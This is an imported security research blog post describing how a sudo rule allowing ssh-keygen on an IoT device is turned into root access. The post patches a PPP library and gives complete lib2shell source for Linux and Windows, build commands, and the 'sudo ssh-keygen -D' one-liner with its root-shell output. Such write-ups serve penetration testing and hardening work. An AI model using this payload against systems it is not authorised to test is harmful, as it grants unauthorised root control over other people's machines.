---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-09_leveraging-ssh-keygen-for-arbitrary-execution-and-privilege-escalation.md
original_filename: 2023-03-09_leveraging-ssh-keygen-for-arbitrary-execution-and-privilege-escalation.md
title: Leveraging ssh-keygen for Arbitrary Execution (and Privilege Escalation)
category: documents
detected_topics:
- command-injection
- supply-chain
- sso
- idor
- access-control
- otp
tags:
- imported
- documents
- command-injection
- supply-chain
- sso
- idor
- access-control
- otp
language: en
raw_sha256: 95c29b6ea0f1675d51d30d522564285f11f8fb1088dfafcbf8b9b4c7eb362cd4
text_sha256: 0378ebd2926c30bb51e422aa2fd0a3e69aa870e7567f7b84494c6fdd8e634e7d
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: true
---

# Leveraging ssh-keygen for Arbitrary Execution (and Privilege Escalation)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-09_leveraging-ssh-keygen-for-arbitrary-execution-and-privilege-escalation.md
- Source Type: markdown
- Detected Topics: command-injection, supply-chain, sso, idor, access-control, otp
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: True
- Raw SHA256: `95c29b6ea0f1675d51d30d522564285f11f8fb1088dfafcbf8b9b4c7eb362cd4`
- Text SHA256: `0378ebd2926c30bb51e422aa2fd0a3e69aa870e7567f7b84494c6fdd8e634e7d`


## Content

---
title: "Leveraging ssh-keygen for Arbitrary Execution (and Privilege Escalation)"
page_title: "SP: Leveraging ssh-keygen for Arbitrary Execution (and Privilege Escalation)"
url: "https://seanpesce.blogspot.com/2023/03/leveraging-ssh-keygen-for-arbitrary.html"
final_url: "https://seanpesce.blogspot.com/2023/03/leveraging-ssh-keygen-for-arbitrary.html"
authors: ["Sean Pesce (@SeanPesce)"]
bugs: ["Local Privilege Escalation", "IoT"]
publication_date: "2023-03-09"
added_date: "2023-03-23"
source: "pentester.land/writeups.json"
original_index: 1402
---

###  TL;DR

  

The ssh-keygen command can be used to load a shared library with the -D flag. This can be useful for privilege escalation (described below), or to translate to arbitrary code execution from argument injection, file overwrites, etc. Proof of concept code can be found on my [GitHub](https://github.com/SeanPesce/lib2shell) (and [here](https://gtfobins.github.io/#+library%20load) is a list of other tools that can be leveraged in the same way).

  

###  Scenario

During a recent security assessment of a Linux-based IoT device, I had acquired low-privilege SSH access. To avoid disclosing unnecessary information about the target implementation, I'll be referring to this user as lowprivuser.

###  sudo

After some basic system enumeration, I started looking for privilege escalation vectors. Obviously, one of the first things I did was check for sudo capabilities (output truncated with "[...]"):
  
  
  $ sudo -l
  [...]
  User lowprivuser may run the following commands on host:
  (ALL) NOPASSWD=***REDACTED*** /usr/bin/ssh-keygen [...]
  [...]
  

I figured I might be able to perform some kind of file corruption/overwrite with ssh-keygen, so I looked it up on [GTFOBins](https://gtfobins.github.io/gtfobins/ssh-keygen/). Surprisingly, I found something better than a file-write:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEgdlnMDstRoxZhh4dHLJDz8BVC25f8wgNSjSgbXPJNh6ocijM7R_fWrpsyRbDUdHtJr27dsslvKvZUdAXsRaQ3tgqG7qBDOcORboLuzRqa-FQ8vvkXjcDU5AW8PIVzBnh5HBF8BxY5bwukevW8nKGSvNPQu2FkfipXlTI_fJ1ZG1iTlgpWbusSLtFBxcw)](https://blogger.googleusercontent.com/img/a/AVvXsEgdlnMDstRoxZhh4dHLJDz8BVC25f8wgNSjSgbXPJNh6ocijM7R_fWrpsyRbDUdHtJr27dsslvKvZUdAXsRaQ3tgqG7qBDOcORboLuzRqa-FQ8vvkXjcDU5AW8PIVzBnh5HBF8BxY5bwukevW8nKGSvNPQu2FkfipXlTI_fJ1ZG1iTlgpWbusSLtFBxcw)

Apparently, ssh-keygen allows loading a shared library with the -D flag. To get a better understanding of this feature, I checked out the [man page](https://linux.die.net/man/1/ssh-keygen):
  
  
  $ man ssh-keygen
  SSH-KEYGEN(1)  BSD General Commands Manual  SSH-KEYGEN(1)
  
  NAME
  ssh-keygen — OpenSSH authentication key utility
  
  SYNOPSIS
  [...]
  ssh-keygen -D pkcs11
  [...]
  -D pkcs11
  Download the public keys provided by the PKCS#11 shared library pkcs11.
  When used in combination with -s, this option indicates that a CA key
  resides in a PKCS#11 token (see the CERTIFICATES section for details).
  [...]
  

This was a big find - if you can load a library, you can run arbitrary code. Clearly, this was a viable privilege escalation vector.

After a bit of Googling, I was unable to find an example of someone using this feature for offensive security purposes, so I decided to figure it out for myself.

###  Preparation

First, I needed to understand the structure of the payload. The mechanism loads a shared library (*.so on Unix, *.dll on Windows), so I probably needed to export some predefined symbol that ssh-keygen was expecting. Developer documentation probably exists for this feature, but I often find it easier to go directly to the source code.

A standard way to load a shared library in C is to use the [dlopen](https://linux.die.net/man/3/dlopen) function. I searched the OpenSSH source code for this function, and found what I was looking for in [ssh-pkcs11.c](https://github.com/openssh/libopenssh/blob/ea5ceecdc2037c5e6e807ab3702fbe3f319351d0/ssh/ssh-pkcs11.c#L486):
  
  
  // [...]
  /* open shared pkcs11-libarary */
  if ((handle = dlopen(provider_id, RTLD_NOW)) == NULL) {
  error("dlopen %s failed: %s", provider_id, dlerror());
  goto fail;
  }
  if ((getfunctionlist = dlsym(handle, "C_GetFunctionList")) == NULL) {
  error("dlsym(C_GetFunctionList) failed: %s", dlerror());
  goto fail;
  }
  p = xcalloc(1, sizeof(*p));
  p->name = xstrdup(provider_id);
  p->handle = handle;
  /* setup the pkcs11 callbacks */
  if ((rv = (*getfunctionlist)(&f)) != CKR_OK) {
  error("C_GetFunctionList failed: %lu", rv);
  goto fail;
  }
  // [...]
  

Let's break this down to understand what's happening. The statement on [line 486](https://github.com/openssh/libopenssh/blob/ea5ceecdc2037c5e6e807ab3702fbe3f319351d0/ssh/ssh-pkcs11.c#L486) attempts to load the shared library into process memory:
  
  
  handle = dlopen(provider_id, RTLD_NOW)
  

The variable provider_id contains the library file path, and the function returns a handle that can be used to interact with the library in memory.

Next, it searches the newly-loaded library for an exported function called C_GetFunctionList and stores the function pointer in the variable getfunctionlist ([line 490](https://github.com/openssh/libopenssh/blob/ea5ceecdc2037c5e6e807ab3702fbe3f319351d0/ssh/ssh-pkcs11.c#L490)):
  
  
  getfunctionlist = dlsym(handle, "C_GetFunctionList")
  

If C_GetFunctionList is found, the function is called ([line 498](https://github.com/openssh/libopenssh/blob/ea5ceecdc2037c5e6e807ab3702fbe3f319351d0/ssh/ssh-pkcs11.c#L498)):
  
  
  rv = (*getfunctionlist)(&f)
  

After that, it doesn't really matter what happens. We control the code inside C_GetFunctionList, so we can do whatever we want. For my scenario, I wanted to get an elevated shell, so the easiest thing to do would be to call one of the functions in the [exec](https://linux.die.net/man/3/exec) family to transform the ssh-keygen process into a new shell instance.

To summarize, I needed to create a shared library (*.so) that exports a function called C_GetFunctionList, and that function would call something like the following:
  
  
  execl("/bin/sh", "/bin/sh", NULL);
  

There was one additional factor: my target device was running on a 32-bit ARM architecture, so I'd either need to cross-compile from my x86_64 system or copy and patch an existing library from the target.

###  Finding a Patch Target

Most of my cross-compilation experience is from creating standard tools with [Buildroot](https://buildroot.org/), but in this case I needed to cross-compile custom code from scratch. Alternatively, I could patch an existing shared library from the target system. Binary patching is an area I have a lot of experience with, so I decided to go in that direction.

To make the patching process as simple as possible, I wanted the original library to have two properties:

  * Imports one of the functions from the exec family
  * Calls the exec function directly from an exported function

First, I scanned the device filesystem for ELF binaries that contained at least one symbol starting with "exec". Symbol-scanning is something I do on a semi-regular basis, so I actually have a [GitHub Gist](https://gist.github.com/SeanPesce/a2f79a5e262c69a02f8cb39fbdd64e1b) with a handy command to do this.
  
  
  $ SYMBOL_NAME="exec" ; \
  find / -type f -exec printf "{}:  " \; -exec sh -c "objdump -T \"{}\" 2>&1 \
  | grep -e \" $SYMBOL_NAME\" ; \ echo \"\"" \; | grep -e " $SYMBOL_NAME" | grep '.so'
  [...]
  /lib/pppd/2.4.9/winbind.so:  00000000  DF *UND*  00000000  GLIBC_<VER>  execl
  [...]
  

I went through several candidates before finding a good one, but eventually I found what I needed in winbind.so, which is part of [Paul's PPP Package](https://github.com/ppp-project/ppp). pppd (and the associated libraries) is a common tool found on Unix systems for handling [Point-to-Point Protocol](https://en.wikipedia.org/wiki/Point-to-Point_Protocol) (PPP).

###  

###  Patching the Target

  

The winbind.so library exports a function, run_ntlm_auth ([line 237](https://github.com/ppp-project/ppp/blob/ba7f7e053daae846a54a1d08d3d133a5f1266ace/pppd/plugins/winbind.c#L237)), that directly calls execl ([line 310](https://github.com/ppp-project/ppp/blob/ba7f7e053daae846a54a1d08d3d133a5f1266ace/pppd/plugins/winbind.c#L310)):
  
  
  unsigned int run_ntlm_auth(const char *username, 
  const char *domain, 
  const char *full_username,
  const char *plaintext_password,
  const u_char *challenge,
  size_t challenge_length,
  const u_char *lm_response, 
  size_t lm_response_length,
  const u_char *nt_response, 
  size_t nt_response_length,
  u_char nt_key[16], 
  char **error_string) 
  {
  // [...]
  execl("/bin/sh", "sh", "-c", ntlm_auth, NULL);  
  // [...]
  

The exact behavior of this function isn't super important; I simply needed to patch it to do what I wanted:

  * Jump directly to the setup for the execl call
  * Patch the third execl argument to be a null pointer (i.e., zero) instead of "-c"

I'm not going to get into the nitty gritty details of the patching, but it basically involved using the [Ghidra](https://ghidra-sre.org/) (dis)assembler and a hex editor to patch in some unconditional branching instructions ([b](https://developer.arm.com/documentation/dui0068/b/CIHFDDAF)). After patching the function, the raw Ghidra decompiler output showed the following:
  
  
  byte* run_ntlm_auth(void)
  {
  FILE *pFVar1;
  byte *pbVar2;
  size_t sVar3;
  char *pcVar4;
  int iVar5;
  __pid_t _Var6;
  int *piVar7;
  int unaff_r4;
  byte **unaff_r7;
  
  execl("/bin/sh", "sh", 0, 0, 0);
  // [...]
  

Any code after the execl call is irrelevant, because the process would be transformed into an instance of /bin/sh.

  

The last thing I needed to do was patch the symbols in the library:

  * Rename run_ntlm_auth to C_GetFunctionList
  * Remove any [DT_NEEDED](https://docs.oracle.com/cd/E19683-01/817-3677/chapter6-42444/index.html) symbols that weren't available in the ssh-keygen process

A brand-new feature of [patchelf](https://github.com/NixOS/patchelf) (symbol renaming) allowed me to do both of these at the same time. The feature is so new that it wasn't available in the package repository of my Linux distribution, so I had to compile it myself ([simple enough](https://github.com/NixOS/patchelf#compiling-and-testing)). The "help" output explains how to use this feature:
  
  
  $ ./src/patchelf --help
  syntax: ./src/patchelf
  [...]
  [--rename-dynamic-symbols NAME_MAP_FILE]  Renames dynamic symbols. The map file should contain two symbols (old_name new_name) per line
  [...]
  [--version]
  FILENAME...
  

To create the "name map" file, I dumped the symbols from winbind.so with objdump -T and did some basic RegEx processing on the output. I then renamed run_ntlm_auth to C_GetFunctionList and renamed all the PPP-specific DT_NEEDED symbols to free (a symbol that's available in every process).
  
  
  $ ./patchelf/src/patchelf --output lib2shell.so --rename-dynamic-symbols symbol_map.txt winbind_patched.so

  

###  Privilege Escalation

  

Finally, I could test my payload:
  
  
  $ scp lib2shell.so lowprivuser@target_device:/tmp/
  lowprivuser@target_device's password=***REDACTED***  100%  14KB  2.3MB/s  00:00
  
  $ ssh lowprivuser@target_device
  lowprivuser@target_device's password=***REDACTED*** id
  uid=1012(lowprivuser) gid=1013(lowprivuser) groups=1013(lowprivuser)
  
  sh-5.1$ sudo ssh-keygen -D /tmp/lib2shell.so
  
  sh-5.1# id
  uid=0(root) gid=0(root) groups=0(root)
  

Boom, full root access.

  

* * *

###  lib2shell

After this experience, I decided to make a quick generic implementation of a shared library that transforms the containing process into a shell. To make it generic, the implementation uses an [ELF constructor](https://www.geeksforgeeks.org/__attribute__constructor-__attribute__destructor-syntaxes-c/) rather than an exported function with a specific name. The entirety of the code for Unix is as follows:
  
  
  // lib2shell.c
  #include <stdio.h>
  #include <unistd.h>
  
  #define SHELL_COMMAND "/bin/sh"
  
  void __attribute__ ((constructor)) constructor()
  {
  puts("[lib2shell by SeanP]");
  printf("Starting %s\n", SHELL_COMMAND);
  long long err = execl(SHELL_COMMAND, "/bin/sh", "-c", SHELL_COMMAND, NULL);
  printf("Result: %lld\n", err);
  }
  

To compile it, simply run the following two shell commands:
  
  
  gcc -c -o lib2shell.o lib2shell.c -Wall -Werror -fpic -I.
  gcc -shared -o lib2shell.so lib2shell.o

Then, like I did on my target, run the following command to get your shell:
  
  
  $ sudo ssh-keygen -D ./lib2shell.so
  [lib2shell by SeanP]
  Starting /bin/sh
  # id
  uid=0(root) gid=0(root) groups=0(root)
  

I also wrote an implementation for Windows (note that it might not work correctly if called from PowerShell):
  
  
  #define WIN32_LEAN_AND_MEAN  // Exclude rarely-used stuff from Windows headers
  
  #include <windows.h>
  #include <stdio.h>
  #include <process.h>
  
  #define SHELL_COMMAND "C:\\Windows\\System32\\cmd.exe"
  
  BOOL APIENTRY DllMain(HMODULE h_module, DWORD  ul_reason_for_call, LPVOID lp_reserved)
  {
  long long err = -2;
  switch (ul_reason_for_call)
  {
  case DLL_PROCESS_ATTACH:
  puts("[lib2shell by SeanP]");
  printf("Starting %s\n", SHELL_COMMAND);
  err = _execl(SHELL_COMMAND, "C:\\Windows\\System32\\cmd.exe", "/c", SHELL_COMMAND, NULL);
  printf("Result: %lld\n", err);
  break;
  case DLL_THREAD_ATTACH:
  case DLL_THREAD_DETACH:
  case DLL_PROCESS_DETACH:
  break;
  }
  return TRUE;
  }
  

Both implementations are also [available on my GitHub](https://github.com/SeanPesce/lib2shell), along with a build script (Unix) and Visual Studio project files (Windows).

  

* * *

###  Updates

  * **2023-03-14:** This blog post was referenced by infosec researcher Leo Pitt ([D00mfist](https://twitter.com/_D00mfist)) in his Medium article, _[Generate Keys or Generate Dylib Loads?](https://medium.com/@D00MFist/generate-keys-or-generate-dylib-loads-c99ed48f323d)_
